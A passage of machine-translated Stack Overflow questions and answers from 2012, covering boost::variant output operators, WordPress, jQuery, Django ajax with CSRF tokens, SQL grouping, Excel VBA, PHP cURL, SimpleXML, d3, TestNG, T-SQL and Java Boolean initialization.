1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\detail\variant_io.hpp(88) : see reference to function template instantiation 'void boost::variant<T0_,T1>::apply_visitor<boost::detail::variant::printer<OStream>>(Visitor &) const' being compiled
1>          with
1>          [
1>              T0_=NsSemSDK::STreeConstructionRuleRegexp,
1>              T1=NsSemSDK::STreeConstructionRuleNumber,
1>              OStream=std::basic_ostream<char,std::char_traits<char>>,
1>              Visitor=boost::detail::variant::printer<std::basic_ostream<char,std::char_traits<char>>>
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\boost\variant\detail\variant_io.hpp(88) : see reference to function template instantiation 'void boost::variant<T0_,T1>::apply_visitor<boost::detail::variant::printer<OStream>>(Visitor &) const' being compiled
1>          with
1>          [
1>              T0_=NsSemSDK::STreeConstructionRuleRegexp,
1>              T1=NsSemSDK::STreeConstructionRuleNumber,
1>              OStream=std::basic_ostream<char,std::char_traits<char>>,
1>              Visitor=boost::detail::variant::printer<std::basic_ostream<char,std::char_traits<char>>>
1>          ]
1>          c:\users\vsevolod.sauta\documents\visual studio 2012\projects\consoleapplication3\consoleapplication3\source.cpp(47) : see reference to function template instantiation 'std::basic_ostream<_Elem,_Traits> &boost::operator <<<char,std::char_traits<char>,NsSemSDK::STreeConstructionRuleRegexp,NsSemSDK::STreeConstructionRuleNumber,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_,boost::detail::variant::void_>(std::basic_ostream<_Elem,_Traits> &,const boost::variant<T0_,T1> &)' being compiled
1>          with
1>          [
1>              _Elem=char,
1>              _Traits=std::char_traits<char>,
1>              T0_=NsSemSDK::STreeConstructionRuleRegexp,
1>              T1=NsSemSDK::STreeConstructionRuleNumber
1>          ]
========== Build: 0 succeeded, 1 failed, 0 up-to-date, 0 skipped ========== 
```

我不知道什么是 T0 类型以及为什么将其转换为 T0。我希望它是 boost::variant 内部的东西。但是我仍然没有任何线索，为什么我会到达那里：定义了变体中所有类型的运算符“<<”。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-18T12:48:07.693

您应该在命名空间 NsSemSDK 内部定义，以便[ADL](http://en.wikipedia.org/wiki/Argument-dependent_name_lookup)`operator<<`可以找到这些函数。（[示例](http://ideone.com/s4uGV)。）

```
#include <string>
#include <iostream>
#include <boost/variant.hpp>

namespace NsSemSDK
{

struct STreeConstructionRuleRegexp {
    std::string m_strEntity;
};

struct STreeConstructionRuleString {
    std::string m_strEntity;
};

struct STreeConstructionRuleIdentifier {
    std::string m_strEntity;
};

typedef int STreeConstructionRuleNumber;

std::ostream& operator<<(std::ostream& stream,
                         const STreeConstructionRuleRegexp& val)
{
    return stream << '\'' << val.m_strEntity << '\'';
}

std::ostream& operator<<(std::ostream& stream,
                         const STreeConstructionRuleString& val)
{
    return stream << '"' << val.m_strEntity << '"';
}

std::ostream& operator<<(std::ostream& stream,
                         const STreeConstructionRuleIdentifier& val)
{
    return stream << val.m_strEntity;
}

typedef boost::variant<
    STreeConstructionRuleRegexp,
    STreeConstructionRuleNumber
> STreeConstructionRuleOperand;

// STreeConstructionRuleString, STreeConstructionRuleIdentifier
}

using namespace NsSemSDK;

int main()
{
    STreeConstructionRuleNumber num = 1024;
    STreeConstructionRuleOperand operand = num;
    std::cout << operand << std::endl;
} 
```

输出

> 1024

# wordpress - 如何在 Wordpress 主页上显示不同数量的帖子

> ID：12954721
> 
> 赞同：0
> 
> 时间：2012-10-18T12:30:37.377
> 
> 标签：wordpress, wordpress-theming

我已经从 WordPress 管理面板设置了每页显示 10 个帖子，但我想在第一页上显示 11 个帖子，在我的例子中是它的主页。所以我想在主页上显示 11 个帖子，而对于所有其他页面，我想显示 10 个帖子。

我正在尝试使用此代码来实现它，但无论页码如何，is_home() 总是返回 true。

```
function home_custom_query( $query ) {

    if (  is_home() )
    {
        $query->query_vars['posts_per_page'] = 11; 
    }

    return $query; 
}
add_filter( 'pre_get_posts', 'home_custom_query' ); 
```

但是上面的代码改变了包括主页在内的所有页面的帖子数量。

我也试过这个来检测页码并尝试如下

```
function home_custom_query( $query ) {

    if (  is_home() && $query->query_vars['paged'] == 0)
    {
        $query->query_vars['posts_per_page'] = 11; 
    }

    return $query; 
}
add_filter( 'pre_get_posts', 'home_custom_query' ); 
```

它将主页的每页帖子更改为 11，但在所有其他页面上不显示任何内容。

我还尝试了[cbnet-different-posts-per-page](http://wordpress.org/extend/plugins/cbnet-different-posts-per-page/)插件，它实现了目的，但它添加了一些我不想使用的额外功能。我需要一个简单的解决方案来解决我的问题。而且我相信会有一个整洁干净的方法来解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:35:09.310

您的模板必须在某处有一个循环，您可以在其中进行查询。您可以在其中提供参数 showposts。她就是一个例子。

```
<?php
$page_num = $paged;
if ($pagenum='') $pagenum =1;

if(is_home) { $showposts = 11 } else { $showposts = 10 }

query_posts('showposts=' .$showposts. '&paged='.$page_num); 
?>

<?php if (have_posts()) : ?>
    <?php while (have_posts()) : the_post(); ?> 
       // WordPress loop
    <?php endwhile; ?> 
<?php endif; ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T19:01:56.473

我做了如下，可能对你也有帮助。

```
<?php
$paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
$page_num = $paged;
if( $paged >1 ) 
    $showposts = 10; 
else 
    $showposts = 11;
query_posts('showposts=' .$showposts. '&paged='.$page_num);
?>

<?php if (have_posts()) : ?>
    <?php while (have_posts()) : the_post(); ?> 
       // WordPress loop
    <?php endwhile; ?> 
<?php endif; ?> 
```

# jquery - 无法让引导菜单出现在标签滑出 div 中

> ID：12954723
> 
> 赞同：0
> 
> 时间：2012-10-18T12:30:45.397
> 
> 标签：jquery, css, twitter-bootstrap

我一直在使用这个标签滑出插件：[http ://www.building58.com/examples/tabSlideOut.html](http://www.building58.com/examples/tabSlideOut.html)

我试图让一个引导嵌套菜单出现在滑出的选项卡中，但由于某种原因，菜单出现在 div 下方。

请参阅以下 [jsfiddle](http://jsfiddle.net/D2RLR/2741/)

我认为让菜单滑出并填充滑出菜单的 div 真的很酷。任何人都可以帮助改善它的外观吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:58:43.750

好的，我可以通过将下拉菜单更改为下拉菜单来使其适合 div

[http://jsfiddle.net/VFJbH/](http://jsfiddle.net/VFJbH/)

那是你想要的吗？

# django - Django - 保存表单值时出现 Ajax 错误

> ID：12954727
> 
> 赞同：0
> 
> 时间：2012-10-18T12:30:52.520
> 
> 标签：django, jquery, django-views

我有一个编辑现有帖子的*编辑表单页面。*我想在这个页面上放一个*预览*链接。我想要的是；当我单击预览链接时，它必须；

1.  获取表单元素的当前值并将它们写入我的 Post_Preview 模型。
2.  然后，ajax 函数必须重定向到我在视图和 URL 中定义的 *show_preview* 页面。
3.  并且必须在 show_preview 页面 (preview.html) 中呈现它。（表单的当前值）

这就是它必须的工作方式。这是我的代码：

**和我的编辑表单页面：**

```
<form method="post" action="">
    {% csrf_token %}
    <input type="hidden" id="post_owner" value="{{ post.owner }}"/></td>
    <input type="hidden" id="post_id" value="{{ post.id }}"> </td>

            {{ form.title }}
            {{ form.body }}

    <a href="#" id="preview">Preview</a>
    <input type="submit" value="Save" style="cursor: pointer;"/>
</form> 
```

**ajax功能：**

```
$(function(){

    $('#preview').click(function() {

        var title = $('#id_title').val();
        var body = $('#id_body').val();
        var owner = $('#post_owner').val(); //hidden value at form page
        var id = $('#post_id').val();  //hidden value at form page

     var ajaxOptions = {
         type:'post',
         url : '/admin/post/save_preview/', //save_preview's url
         data : {
             'title' : title,
             'body'  : body,
             'owner' : owner,
             'id'    : id
         },
         success: function(){
             window.open("/blog/"+owner+"/preview/"+id); //show_preview's url
         },
         error: function(){
            alert('There is an Error'); //this is what i see when click preview link.
         }
     };
       $.ajax(ajaxOptions);
});
}); 
```

**我的 save_preview 视图：**

```
def save_preview(request):
    title = request.POST['title']
    body = request.POST['body']
    owner = request.POST['owner']
    post_id = request.POST['id']
    try:
        preview = Post_Preview(id=post_id, title=title, body=body, owner=owner)
        preview.save()
    except:
        pass
    return HttpResponse(200) 
```

**我的 show_preview 视图：**

```
def show_preview(request,post_id,username):
    preview = Post_Preview.objects.get(id=post_id)

    return render_to_response('preview.html',{'post': preview}, context_instance=RequestContext(request)) 
```

**我的相关网址行：**

```
url(r'^admin/post/save_preview/', view='save_preview' ,name='save_preview'),
url(r'^blog/(?P<username>[-\w]+)/preview/(?P<post_id>\d+)', view='show_preview', name='show_preview'), 
```

当我在编辑表单页面单击预览链接时：它显示“有错误”错误；这是在 ajax 函数中定义的。

谢谢你！

编辑：在 js 文件中我的 ajax 函数之前有更多代码（与 django-ajax 关系有关）：

```
function getCookie(name) {
    var cookieValue = null;
    if (document.cookie && document.cookie != '') {
        var cookies = document.cookie.split(';');
        for (var i = 0; i < cookies.length; i++) {
            var cookie = jQuery.trim(cookies[i]);
            // Does this cookie string begin with the name we want?
            if (cookie.substring(0, name.length + 1) == (name + '=')) {
                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}
var csrftoken = getCookie('csrftoken');

function csrfSafeMethod(method) {
    // these HTTP methods do not require CSRF protection
    return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
}
function sameOrigin(url) {
    // test that a given url is a same-origin URL
    // url could be relative or scheme relative or absolute
    var host = document.location.host; // host + port
    var protocol = document.location.protocol;
    var sr_origin = '//' + host;
    var origin = protocol + sr_origin;
    // Allow absolute or scheme relative URLs to same origin
    return (url == origin || url.slice(0, origin.length + 1) == origin + '/') ||
        (url == sr_origin || url.slice(0, sr_origin.length + 1) == sr_origin + '/') ||
        // or any other URL that isn't scheme relative or absolute i.e relative.
        !(/^(\/\/|http:|https:).*/.test(url));
}
$.ajaxSetup({
    beforeSend: function(xhr, settings) {
        if (!csrfSafeMethod(settings.type) && sameOrigin(settings.url)) {
            // Send the token to same-origin, relative URLs only.
            // Send the token only if the method warrants CSRF protection
            // Using the CSRFToken value acquired earlier
            xhr.setRequestHeader("X-CSRFToken", csrftoken);
        }
    }
}); 
```

编辑 2：当我为 save_preview 添加 try/except 块时；我没有抛出弹出错误页面。它重定向到 save_preview 页面并抛出错误：

```
Post_Preview matching query does not exist.

156\. preview = Post_Preview.objects.get(id=post_id) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:46:00.573

您没有在 $.ajax 中发送 csrf 令牌。

# javascript - 如何使用 jquery 选择器添加打开的 div 标签？

> ID：12954728
> 
> 赞同：4
> 
> 时间：2012-10-18T12:30:52.137
> 
> 标签：javascript, jquery, jquery-selectors

> **可能重复：**
> [使用 .after() 添加 html 关闭和打开标签](https://stackoverflow.com/questions/8706457/using-after-to-add-html-closing-and-open-tags)

我需要在 a 之前`<li>`和之后添加一些 HTML `<li>`。

选择器可以工作，但是当它添加 HTML 时，它也会`<div>`通过添加来关闭 s `</div>`。我需要它打开。

我的代码：

```
$('#ja-megamenu .level1').before('<div class="childcontent cols1 ">'); 
```

注意：我只需要`<div class="childcontent cols1 ">`在`li`(with class="level1")之前添加它

然后稍后我将使用：

```
 $('#ja-megamenu .level1').after('</div>'); 
```

添加关闭`</div>`

此代码不起作用。我怎样才能让它工作？

整天都在阅读文档，但还没有找到答案......

谢谢 ：-）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-18T12:32:15.687

你不能这样做，如果你想在元素周围添加一个 div，请使用[jQuery 的 wrap()](http://api.jquery.com/wrap/)。

```
$('#ja-megamenu .level1').wrap('<div class="childcontent cols1 "></div>'); 
```

但是你遇到的问题是一个 div 不能换一个 li！你需要做点别的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-18T12:32:52.600

尽管此 HTML 无效（`<li>`不能是父级`<div>`），但您可以使用[`wrap()`](http://api.jquery.com/wrap/)：

```
$("#ja-megamenu .level1").wrap("<div class='childcontent cols1' />"); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:32:41.163

尝试使用[**wrap**](http://api.jquery.com/wrap/)，如果你想要你的 html ，你可以尝试在之前和之后添加。

```
$('#ja-megamenu .level1').wrap('<div class="childcontent cols1 ">'); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-18T12:33:20.667

使用包装...

```
$('#ja-megamenu .level1').wrap('<div class="childcontent cols1">'); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-18T12:37:24.237

首先你这是无效的操作，因为你不能在`div`之前或之后添加`li`，

该`li`元素必须在`ul`or`ol`容器中，并且其兄弟元素必须在`li`.

所以试着改变你的结构：也许把`div`里面`li`

```
<ul>
    <li class="level1"><div></div></li>
    <li></li>
    <li></li>
</ul>

$('.level1').prepend('<div> Your content here</div>'); 
```

# sql - 在多列上计数和分组

> ID：12954730
> 
> 赞同：-1
> 
> 时间：2012-10-18T12:30:58.017
> 
> 标签：sql, database

我对 SQL 完全陌生。我创建了下表..

```
Employee
- employee_id
- employee_name

Projects
- project_id
- project_name

Roles
- role_id
- role_name

Employee_project_role
- employee_id
- project_id
- role_id 
```

我必须编写一个查询：列出具有不同角色数量的员工以及列出角色。即，如果员工（emp1）在一个项目中担任团队负责人（TL），在其他两个不同项目中担任测试员（TEST），那么输出应该是：

```
employee_name   count   Role
---------------------------
  emp1           1      TL
  emp1           2      TEST 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:52:27.793

尝试，

```
SELECT COUNT(my_table.*), my_table.employee_name, my_table.role 
FROM 
(SELECT r.role_name as role, e.employee_name as employee_name 
FROM employee e 
JOIN employee_project_role epr ON epr.employee_id = e.employee_id 
JOIN roles r ON r.role_id = epr.role_id) my_table
GROUP BY my_table.employee_name, my_table.role; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:57:54.343

使用分组来合计项目总和。

```
SELECT emp.employee_name,count(proj.project_name),role.role_name
FROM employee emp , project proj , role role , employee_project_role main
WHERE emp.employee_id = main.employee_id
AND proj.project_id = main.project_id
AND role.role_id = main.role_id
group by emp.employee_name , role.role_name 
```

在这里检查一下[SqlFiddle](http://sqlfiddle.com/#!3/a970c/1)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:33:44.190

```
select
    E.employee_name,
    count(*) as cnt,
    R.role_name
from Employee_project_role as EPR
    left outer join Employee as E on E.employee_id = EPR.employee_id
    left outer join Roles as R on R.role_id = EPR.role_id
group by E.employee_name, R.role_name 
```

# excel - Excel 数据透视表条件格式

> ID：12954742
> 
> 赞同：2
> 
> 时间：2012-10-18T12:31:42.303
> 
> 标签：excel, vba, module, pivot-table

我在 Excel 工作表中有一个数据透视表，其中包含对我的数据库进行的查询的结果。我想根据其他所有数据集自动格式化信息。

该信息包含按员工 ID 号排序的每位员工 4 周（1 个月）的记录。我想编写一个模块，以便它以不同的颜色突出显示所有其他记录（员工数据集）。这甚至可能吗？谢谢您的帮助！

![在此处输入图像描述](../Images/ce196c83e65e0cc080f656020cd929db.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T13:08:00.057

如果您坚持使用 VBA 解决问题，这里就是一个例子。您需要指定起始范围。请不要标记整行会使用更多内存（增加文件大小），所以我宁愿使用示例： range("A2:E2).select ....

```
Sub FormatEverySecondRow()
         range("A2").EntireRow.Select
         Do While ActiveCell.value <> ""
             Selection.Interior.ColorIndex = 15
             ActiveCell.offset(2, 0).EntireRow.Select
         Loop
End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T14:40:16.953

使用辅助列（如果我计算示例中的列，则为 K）

插入K2：

```
=IF(ISBlank(C2),K1,MOD(K1+1,2)) 
```

然后使用条件格式突出显示该行：

![条件格式](../Images/23bb148f3f3b4f25d1980b7cc513ad61.png)

注意公式在 2 之前**没有**$ 符号（即 $K2，不是 $K$2）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T15:33:54.843

这可能对您有用：

```
Sub HighlightDifferentRows()

Dim wksht As Worksheet
Dim wkb As Workbook
Dim row As Range
Dim FloatColor As Long

FloatColor = RGB(100, 100, 100)

Set wbk = ThisWorkbook

Application.ScreenUpdating = False

For Each row In Sheets(1).UsedRange.Rows
    row.Interior.Color = FloatColor
    If row.Cells(1, 4).Value <> row.Cells(2, 4).Value Then
        FloatColor = -FloatColor
    End If
Next row

Application.ScreenUpdating = True

End Sub 
```

![AlternateColorsAfterMacro](../Images/91c5a4750e5ea33d0a95000618dc98a5.png)

每当单元格值与其下方的值不同时，它会交替行颜色。现在它被设置为灰色，但如果你愿意，你可以把它改成更亮的颜色。你可以输入你自己的逻辑来得到你想要的任何颜色。祝你好运。

# php - 如何防止php curl多连接

> ID：12954744
> 
> 赞同：0
> 
> 时间：2012-10-18T12:31:48.980
> 
> 标签：php, api, twitter, streaming

我构建了一个 php cli 脚本，它使用 cURL 将推文从 twitter 流 api 输出到命令行。当我启动脚本时，它开始输出推文，但在每 50 条推文时，我都会收到以下错误：“很容易，Turbo。最近请求太多。增强你的冷静。”，没有标题，没有其他输出，只有一个字符串。

我假设我建立了太多的连接，但我只初始化了一次 cURL。这是我的代码：

```
//initialize cURL connection
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://stream.twitter.com/1.1/statuses/filter.json?  follow=34572451,27260086');
curl_setopt($ch, CURLOPT_USERPWD, 'USERNAME:PASSWORD');
curl_setopt($ch, CURLOPT_WRITEFUNCTION, 'saveTweet');
curl_setopt($ch, CURLOPT_MAXCONNECTS, 1);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Cache-Control: max-age=0', 'Connection: keep-alive', 'Keep-Alive: 3600'));

//then loop the execution to retrieve tweets
while(1){
    echo $i++.'->'; //echo number, so we know it stops at 50

    try {
        //calls saveTweet() as callback, which only purpose is to output the tweet
        curl_exec($ch); 
    }
    catch(Exception $e) {
        //echo error described above
        echo $e->getMessage(); 
        break;
    }
} 
```

如何防止 cURL 发出太多请求（如果这样做，我真的不知道确切的问题）？或者如何防止出现上述错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:48:27.183

你可以运行无限循环，你需要偶尔[睡觉](http://php.net/manual/en/function.sleep.php)和[睡觉](http://www.php.net/manual/en/function.usleep.php)

```
sleep(1); 
```

您还想查看计数选项`count` ：

> 指定要检索的记录数。必须小于或等于 200。默认为 20。

这样，您可以通过单个请求提取更多记录...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T13:00:28.590

显然你打开了太多的连接：

```
curl_setopt($ch, CURLOPT_FORBID_REUSE, true); 
```

您可以汇集连接以供重用并测试它吗？

TPS：交易/第二次 DOS：拒绝服务；用尽资源

# jquery - jQuery - 滚动侧边栏

> ID：12954759
> 
> 赞同：1
> 
> 时间：2012-10-18T12:32:29.120
> 
> 标签：jquery, scroll

我正在尝试创建一个随页面滚动的侧边栏。但我希望它在用户滚动到侧边栏的顶部边框后开始滚动。

（facebook 在首页上的方式以及与用户一起滚动的添加滚动）和[此](http://www.feissarimokat.com/)站点（如果您滚动到页面底部，其中一个添加始终跟随您）

我想知道我将如何实现它。

我尝试了以下代码段，但这会立即开始滚动并且不适用于液体布局，因为我希望侧边栏保持在同一个位置并且只向下滚动。

```
$(window).scroll(function () { 
    $("#sidebar").css("position", "fixed").css("top", "50px").css("right", "50px");         
});​ 
```

还有一个相关的[小提琴。](http://jsfiddle.net/ChristianNikkanen/xg54b/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:39:03.440

定义`minHeight`

```
minHeight = YOUR-FAVORITE-HEIGHT-IN-PIXEL-WITHOUT' px'; 
```

万一，在`scroll`检查后做你想做的一切：

```
if($(window).scrollTop() > minHeight) {
   // change sidebar style, blah blah blah...
}esle{
   // roll back sidebar style, blah blah blah...
} 
```

**编辑：**

设置`minHeight`为`$('#sidebar').offset().top;`

# php - 如何使用 SimpleXML 解析 XML 忽略错误

> ID：12954771
> 
> 赞同：1
> 
> 时间：2012-10-18T12:33:08.170
> 
> 标签：php, xml, xml-parsing, simplexml

我的 .xml 文档通常包含错误。无论如何，我都想解析我的文档直到出现错误或尝试自动修复错误。那可能吗？

我试过这个，但它不工作

```
 $xml = simplexml_load_file($url, "SimpleXMLElement", array(LIBXML_NOERROR, LIBXML_ERR_NONE));

    if (!$xml) {
        echo "Failed loading XML\n";
        foreach(libxml_get_errors() as $error) {
            echo "\t", $error->message;
        }
    } 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-18T13:45:14.993

从 PHP DOC [simplexml_load_file](http://php.net/manual/en/function.simplexml-load-file.php)选项应该是 int 而不是数组

代替

```
$xml = simplexml_load_file($url, "SimpleXMLElement", array(LIBXML_NOERROR, LIBXML_ERR_NONE));
                                                       ^------- You are using array 
```

和

```
$xml = simplexml_load_file($url, "SimpleXMLElement", LIBXML_NOERROR |  LIBXML_ERR_NONE); 
```

除了抑制此错误，您还可以使用[Tidy](http://php.net/manual/en/book.tidy.php)包修复 xml。

示例**bad.xml**

```
<Family>
    <name>Hankre</name>
    <adults>2</adults>
    <kids > 16 </kids>
    <food>
        <tag>Nice </tag>
        <tag>Food </tag>
        <tag /> 
```

修复 XML

```
$config = array(
    'indent' => true,
    'clean' => true,
    'input-xml'  => true,
    'output-xml' => true,
    'wrap'       => false
    );

$tidy = new Tidy();
$xml = $tidy->repairfile($badXML, $config);
echo $xml; 
```

输出

```
<Family>
    <name>Hankre</name>
    <adults>2</adults>
    <kids>16</kids>
    <food>
        <tag>Nice</tag>
        <tag>Food</tag>
        <tag />
    </food>
</Family> 
```

# javascript - 箱线图中的画笔选择（d3.js）

> ID：12954776
> 
> 赞同：1
> 
> 时间：2012-10-18T12:33:22.007
> 
> 标签：javascript, d3.js, scatter-plot, brush

在 d3.js 的箱形图中是否有任何画笔选择选项？

喜欢以下链接中的选择

[http://mbostock.github.com/d3/ex/splom.html](http://mbostock.github.com/d3/ex/splom.html)

![在此处输入图像描述](../Images/a6c063059cf98886c8ec9bb35661d44d.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T19:39:51.273

D3 不是图表库，因此它不会将画笔控件之类的东西作为选项公开，而是作为可配置组件公开。您可以使用[`d3.svg.brush()`](https://github.com/mbostock/d3/wiki/SVG-Controls#wiki-brush)将画笔控件附加到任何可视化，包括设置要使用的比例以及定义在画笔事件之前、期间和之后要执行的操作的处理程序。

# selenium - 如何使用 SeleniumWebDriver(Java) 和 TestNG 以特定顺序运行测试类？

> ID：12954779
> 
> 赞同：3
> 
> 时间：2012-10-18T12:33:27.123
> 
> 标签：selenium, automated-tests, selenium-webdriver, testng

我想使用 TestNG 以特定顺序运行 Selenium WebDriver (Java) 测试类。

例如。我有 3 个类，例如 Test1、Test2 和 Test3。我想按Test2、Test1和Test3的顺序运行。不分组可以吗？

我尝试了以下方式，但我按照自己的顺序（字母顺序）运行。

```
<suite name="MyTestSuite" verbose="4">

<test name="MyTest">
   <classes>
        <class name="com.mypackage.Test2" />
        <class name="com.mypackage.Test1" />
        <class name="com.mypackage.Test3" />
   </classes>
</test> 
```

有没有其他方法可以做到这一点？没有分组这可能吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T12:37:39.980

只需使用*preserve-order="true"*使类按给定顺序运行。

```
<suite name="MyTestSuite" verbose="4">

<test name="MyTest" >
   <classes preserve-order="true">
        <class name="com.mypackage.Test2" />
        <class name="com.mypackage.Test1" />
        <class name="com.mypackage.Test3" />
   </classes>
</test> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-02-14T19:37:44.723

试试这个测试计划（.xml）

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE suite SYSTEM "http://testng.org/testng-1.0.dtd">
  <suite name="MyTestSuite" preserve-order="true">
     <test name="MyTest">
        <classes>
             <class name="com.mypackage.Test2"> </class>
        </classes>
    </test>
    <test name="MyTest 1">
       <classes>
          <class name="com.mypackage.Test1"> </class>
        </classes>
    </test>
    <test name="MyTest 2">
        <classes>
          <class name="com.mypackage.Test3"> </class>
        </classes>
    </test>
</suite> 
```

# sql-server - 重构 T-SQL 嵌套 SELECT 查询以在 case 语句中使用

> ID：12954781
> 
> 赞同：2
> 
> 时间：2012-10-18T12:33:39.323
> 
> 标签：sql-server, sql-server-2008, sql-server-2005, sql-server-2008-r2

我有下表：

```
maker   model   type
B   1121    pc
A   1233    pc
E   1260    pc
A   1752    laptop
A   1276    printer
D   1288    printer 
```

我需要以以下形式收到结果：制造商、电脑。如果特定制造商有给定类型的模型，我需要将“是”这个词与括号中的模型数量连接起来。前任。是（1）对于制造商'A'。那么，我怎样才能避免以下重复呢？

```
CASE 
WHEN SELECT COUNT(*) WHERE ... > 0
THEN 'yes(' + CAST((SELECT COUNT(*) WHERE ...) AS varchar) + ')' 
```

这不是现实世界的问题。我只需要了解如何保存子查询结果以在分支语句中使用它。该分支语句的结果可能包含子查询结果本身。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:46:38.230

创建表：

```
create table #t (maker varchar(100), model  varchar(100), type varchar(100) );
insert into #t ( maker,   model,   type )  values 
( 'B',   '1121',    'pc'),
( 'A',   '1233',    'pc'),
( 'E',   '1260',    'pc'); 
```

简单步骤查询：

```
;with 
totals as (
   select maker, type,
       count( * ) as n
   from
       #t
   group by 
      maker,  type
      ) ,
maker_type as (
   select distinct maker, type
   from #t
)
select 
   mm.*, t.n, 
   case  when t.n is null then 'No' else 'Yes' end as yes_no
from
   maker_type mm
left outer join
   totals t
      on mm.maker = t.maker and
         mm.type = t.type 
```

[结果](https://data.stackexchange.com/stackoverflow/query/82731?opt.textResults=true)：

```
maker type n yes_no 
----- ---- - ------ 
A     pc   1 Yes    
B     pc   1 Yes    
E     pc   1 Yes 
```

我不扩展连接字符串的解决方案，因为我看到您知道该怎么做。可以自由更改第一个或第二个 CTE 查询以符合您的要求。

# sql-server - 使用 sqsh 的数据库名称中的空格

> ID：12954785
> 
> 赞同：0
> 
> 时间：2012-10-18T12:33:53.690
> 
> 标签：sql-server, linux, sqsh

我正在尝试使用 sqsh 连接到 MSSQL 数据库，但我无法指定要使用的数据库，因为它的名称中有空格，我尝试转义并将其括在方括号/引号等中，但无法获得它工作 - 任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T15:40:24.440

根据 sqsh[网站](http://www.sqsh.org/)，它是 Sybase 的客户端工具，而不是 SQL Server，因此不能保证它会起作用，尽管显然[有些人](https://stackoverflow.com/questions/8229646/sqsh-sql-server-2005-execute-sql-file)已经成功了。

无论如何， SQL Server 中[正确的分隔符](http://msdn.microsoft.com/en-us/library/ms176027%28v=sql.100%29.aspx)是方括号，但我不知道 sqsh 是否会在命令行上正确解析：`[Database Name With Spaces]`.

如果这不起作用，但您可以连接到 SQL Server，那么您应该能够添加`USE [Database Name With Spaces]`到脚本的顶部或直接输入。

如果您根本无法连接到 SQL Server，那么您应该首先解决该问题。您尚未提供有关您的环境（客户端操作系统、SQL Server 版本、编程语言和库等）的任何信息，但可能您使用的是 Linux，因此您可能需要查看此站点上有关从以下位置连接到 SQL Server的[众多问题](https://stackoverflow.com/search?q=linux%20connect%20mssql&submit=search)Linux。

# java - 使用 Boolean.FALSE/.TRUE 初始化布尔值 - 为什么？

> ID：12954787
> 
> 赞同：7
> 
> 时间：2012-10-18T12:33:55.737
> 
> 标签：java, boolean

在我们公司的一些项目代码中，我经常看到这样的内容：

```
boolean foo = Boolean.FALSE; 
```

除了 AFAIK 我只需要在 Java 中初始化局部变量（没有像 Pascal 那样的随机值）之外，除了特别是对于布尔值我经常想要初始化的事实之外，我在这里错过了什么？为什么不：

```
boolean foo = false; 
```

我不明白。PMD 和 Findbugs 等代码分析工具也标记了这一点。但为什么？

编辑：除了对字节码了解太多之外，我创建了一个示例类并对其进行了反编译。Boolean.FALSE 转到：

```
0: getstatic #15 // Field java/lang/Boolean.FALSE:Ljava/lang/Boolean; 
3: invokevirtual #21 // Method java/lang/Boolean.booleanValue:()Z 
6: istore_1 
```

“假”变体去了：

```
0: iconst_1 
1: istore_1 
```

因此，在对此没有太多了解的情况下，我猜想更多的语句意味着更多的执行时间，所以从长远来看，这不仅是错误的，而且速度也会变慢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-18T12:47:05.923

```
boolean foo = Boolean.FALSE; 
```

这是一个奇怪且不必要的复杂代码，由可能不太了解 Java 的人编写。你不应该写这样的代码，PMD 和 FindBugs 正确地标记了这一点。

`Boolean.FALSE`是一个`java.lang.Boolean`自动拆箱的对象；编译器基本上将其转换为：

```
boolean foo = Boolean.FALSE.booleanValue(); 
```

> 我根本不需要在 Java 中初始化变量......

成员变量不需要显式初始化；如果不这样做，它们将使用默认值初始化（`false`在 的情况下`boolean`）。局部变量确实需要显式初始化；如果你尝试使用一个局部变量而不初始化它，编译器会给你一个错误。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-18T12:44:17.327

两者都是一样的。但`boolean foo = false;`足够了。

* * *

## 回答 #3

> 赞同：2
> 
